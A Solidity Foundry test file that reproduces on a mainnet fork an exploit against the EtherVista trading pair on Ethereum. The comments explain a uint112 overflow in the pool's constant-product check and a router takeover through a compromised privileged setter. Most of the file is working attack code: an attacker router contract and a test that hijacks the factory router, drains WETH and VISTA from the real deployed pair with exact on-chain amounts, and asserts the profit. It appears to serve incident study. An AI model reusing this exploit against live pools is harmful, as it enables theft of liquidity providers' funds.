// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// EtherVista (EtherVistaPair) - uint112 constant-product (K) invariant overflow lets a swap drain the pool - Ethereum, 2026-10-09.
//
// Run: forge test --evm-version cancun --match-test testExploit -vvv
//
// Profit (exact on-chain figures, reproduced live against the real deployed bytecode at the fork block):
//   +7.477952467865157795 WETH  (net to the attacker-controlled router)
//   +43855.902196275763910452 VISTA (the project token, to the attacker)
//   The WETH leg is the dollar loss (~$18.6K reported by SlowMist). The pool held ~21.37 WETH + ~125,302 VISTA
//   before the attack and ~13.89 WETH + ~81,446 VISTA after - i.e. 7.478 WETH and 43,856 VISTA were extracted.
//
// On-chain references (Ethereum mainnet, chainId 1):
//   drain tx            : 0xb2c7332d9e1be6a86d9d37083aa4cc0d94b60eb95cc9b29494555a3c09764930  (block 26152259)
//   router-takeover tx  : 0xc97ad886a4cbd022edc33deaa44656d66814fe3df1142d03802c96ce7632cc7a  (block 26152250)
//   fork at parent block: 26152258
//   attacker EOA        : 0xBBf8f3fe8e4FdF6b594E6107144D78293D2018Fa
//   attacker router     : 0x469424b628a9d2036e41496e814Db500D683b120  (UNVERIFIED - reconstructed below)
//   routerSetter (priv) : 0xCA90D843288E35beeADfCe14E5F906e3F1AFc7cB  (held/compromised by the attacker)
//   legit router (pre)  : 0x9bD63C5D44fF28390df1EaaFD4eB4BD73E94A72a
//   SlowMist alert      : https://x.com/SlowMist_Team/status/2108427455572918626
//
// Actors / contracts (REAL deployed bytecode on the fork - not mocked):
//   EtherVistaPair (vulnerable)   : 0xfdd05552F1377aA488AFed744c8024358AF02041  (verified, solc 0.5.16)
//   EtherVistaFactory             : 0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4  (verified, solc 0.5.16)
//   WETH (token0)                 : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
//   VISTA (token1, project token) : 0xC9bCa88B04581699fAb5aa276CCafF7Df957cbbf
//
// ROOT CAUSE (confirmed from the verified EtherVistaPair source, swap() ~line 611):
//   The constant-product invariant at the end of swap() is written as:
//
//       require(balance0 * balance1 >= reserve0 * reserve1, "K");
//
//   balance0 / balance1 are local `uint` (uint256), but reserve0 / reserve1 are the pair's STORAGE
//   `uint112 private` fields. Under solc 0.5.16 (pre-0.8, NO built-in overflow checks) the sub-expression
//   `reserve0 * reserve1` is evaluated at the operands' type width - uint112 - and WRAPS mod 2**112
//   (2**112 ~= 5.19e33). For any realistic 18-decimal pool the true product reserve0*reserve1 is far larger
//   than 2**112 (here ~21.37e18 * ~125302e18 ~= 2.68e42), so the right-hand side collapses to a tiny wrapped
//   value. The left side (balance0 * balance1) is a full uint256 product. Result: the "K" check passes even
//   when the attacker removes almost the entire reserve, because it is comparing a real product against a
//   garbage wrapped one. Uniswap-V2's original code multiplies the reserves as uint256 (`uint(_reserve0) *
//   _reserve1`); EtherVista dropped that widening, reintroducing the classic uint112 overflow.
//
//   swap() is gated by `require(msg.sender == IEtherVistaFactory(factory).router())`, so to call it the
//   attacker first had to BECOME the factory's router. The factory's setRouter(address) is protected only by
//   `require(msg.sender == routerSetter)` with no timelock. The attacker controlled routerSetter
//   (0xCA90...7cB) and, one tx earlier (block 26152250), called factory.setRouter(attackerRouter), replacing
//   the legitimate router 0x9bD63C... with the malicious contract 0x469424....
//
// THE ATTACK (one atomic tx on the drain block; every figure is taken verbatim from the trace):
//   Pre-req (block 26152250): routerSetter -> factory.setRouter(attackerRouter).  [reproduced via vm.prank]
//   Drain (block 26152259), executed by the attacker router (now = factory.router()):
//     0. VISTA.transfer(pair, 1)                       - 1 wei VISTA so swap()'s amountIn>0 check passes.
//     1. pair.swap(21.365578479614736555 WETH out, 0, router, "")   - drains almost all WETH; K check passes
//        only because reserve0*reserve1 overflowed uint112. (input: 1 wei VISTA)
//     2. WETH.transfer(pair, 9.026956903960976779); pair.sync()     - reseed reserve0 so swap #2 has WETH depth.
//     3. WETH.transfer(pair, 4.860669107788601981)                  - input for swap #2.
//     4. pair.swap(0, 43855.902196275763910452 VISTA out, router, "") - drains VISTA; K check again passes on
//        the overflowed invariant.
//   Net to the router: 21.3656 - 9.0270 - 4.8607 = 7.4780 WETH, plus 43855.9 VISTA.
//
// NOTE ON RECONSTRUCTION: the attacker's router 0x469424... is UNVERIFIED on Etherscan. The
//   EtherVistaAttackRouter contract below is a MINIMAL FAITHFUL RECONSTRUCTION of its observed behaviour - it
//   issues the exact same calls, in the same order, with the exact same amounts seen in the on-chain trace. In
//   the real tx the final VISTA was forwarded to the attacker EOA (0xBBf8...); here it is kept in the router so
//   a single address holds all proceeds for a clean profit assertion. The vulnerable pair and the factory are
//   the REAL deployed contracts on the fork; nothing about the vulnerability is mocked.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IEtherVistaPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IEtherVistaFactory {
    function router() external view returns (address);
    function routerSetter() external view returns (address);
    function setRouter(address) external;
}

/// @notice MINIMAL FAITHFUL RECONSTRUCTION of the unverified on-chain attacker router
///         0x469424b628a9d2036e41496e814Db500D683b120. Replays the exact swap sequence from the attack trace.
contract EtherVistaAttackRouter {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant VISTA = 0xC9bCa88B04581699fAb5aa276CCafF7Df957cbbf;

    function attack(
        IEtherVistaPair pair,
        uint256 wethOut1, // WETH drained in swap #1
        uint256 wethReseed, // WETH pushed back + sync to restore reserve0 depth
        uint256 wethIn2, // WETH input for swap #2
        uint256 vistaOut2 // VISTA drained in swap #2
    ) external {
        // 0. seed 1 wei of VISTA so swap()'s `amount1In > 0` input check is satisfied.
        IERC20(VISTA).transfer(address(pair), 1);

        // 1. drain WETH - passes only because reserve0*reserve1 overflows uint112 in the "K" check.
        pair.swap(wethOut1, 0, address(this), "");

        // 2. re-seed reserve0 with WETH and sync so swap #2 has depth to price VISTA out.
        IERC20(WETH).transfer(address(pair), wethReseed);
        pair.sync();

        // 3. supply WETH input for swap #2.
        IERC20(WETH).transfer(address(pair), wethIn2);

        // 4. drain VISTA - "K" check again passes on the overflowed invariant.
        pair.swap(0, vistaOut2, address(this), "");
    }
}

contract EtherVistaExploit is BaseTestWithBalanceLog {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant VISTA = 0xC9bCa88B04581699fAb5aa276CCafF7Df957cbbf;
    IEtherVistaPair constant PAIR = IEtherVistaPair(0xfdd05552F1377aA488AFed744c8024358AF02041);
    IEtherVistaFactory constant FACTORY = IEtherVistaFactory(0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4);
    address constant ROUTER_SETTER = 0xCA90D843288E35beeADfCe14E5F906e3F1AFc7cB;

    // Exact amounts from the on-chain drain tx trace.
    uint256 constant WETH_OUT_1 = 21_365_578_479_614_736_555; // ~21.3656 WETH
    uint256 constant WETH_RESEED = 9_026_956_903_960_976_779; //  ~9.0270 WETH
    uint256 constant WETH_IN_2 = 4_860_669_107_788_601_981; //  ~4.8607 WETH
    uint256 constant VISTA_OUT_2 = 43_855_902_196_275_763_910_452; // ~43855.9 VISTA

    EtherVistaAttackRouter attacker_;

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org", 26_152_258);
        // Warp to the real drain block timestamp (harmless for swap(); keeps price accumulators faithful).
        vm.warp(1_791_517_679);
        vm.roll(26_152_259);
    }

    function testExploit() public balanceLog {
        attacker_ = new EtherVistaAttackRouter();
        attacker = address(attacker_); // profit-logging address (multi-asset)
        multiAssetLog = true;
        fundingTokens.push(WETH);
        fundingTokens.push(VISTA);

        // Sanity: confirm the uint112 K-check will overflow at these reserves.
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        unchecked {
            uint112 wrapped = r0 * r1; // mimics solc 0.5.16 uint112 * uint112
            uint256 real = uint256(r0) * uint256(r1);
            require(real > (uint256(1) << 112), "reserves product below 2^112");
            require(uint256(wrapped) < real, "no uint112 overflow");
            emit log_named_uint("reserve0 (WETH)", r0);
            emit log_named_uint("reserve1 (VISTA)", r1);
            emit log_named_uint("real reserve0*reserve1", real);
            emit log_named_uint("uint112-wrapped reserve0*reserve1 (what swap() actually checks)", uint256(wrapped));
        }

        // --- Step A: router takeover (reproduces block 26152250's setRouter tx) ---
        // The attacker-controlled routerSetter installs the malicious router. No timelock guards this.
        vm.prank(ROUTER_SETTER);
        FACTORY.setRouter(address(attacker_));
        require(FACTORY.router() == address(attacker_), "router takeover failed");

        // Seed 1 wei of VISTA to the attacker router for the swap-input check.
        deal(VISTA, address(attacker_), 1);

        // --- Step B: the drain (reproduces block 26152259) ---
        attacker_.attack(PAIR, WETH_OUT_1, WETH_RESEED, WETH_IN_2, VISTA_OUT_2);

        uint256 wethProfit = IERC20(WETH).balanceOf(address(attacker_));
        uint256 vistaProfit = IERC20(VISTA).balanceOf(address(attacker_));
        emit log_named_decimal_uint("WETH profit", wethProfit, 18);
        emit log_named_decimal_uint("VISTA profit", vistaProfit, 18);

        // Exact on-chain realized figures.
        assertApproxEqRel(
            wethProfit, 7_477_952_467_865_157_795, 0.01e18, "WETH profit mismatch vs on-chain"
        );
        assertApproxEqRel(
            vistaProfit, VISTA_OUT_2, 0.01e18, "VISTA profit mismatch vs on-chain"
        );
    }
}
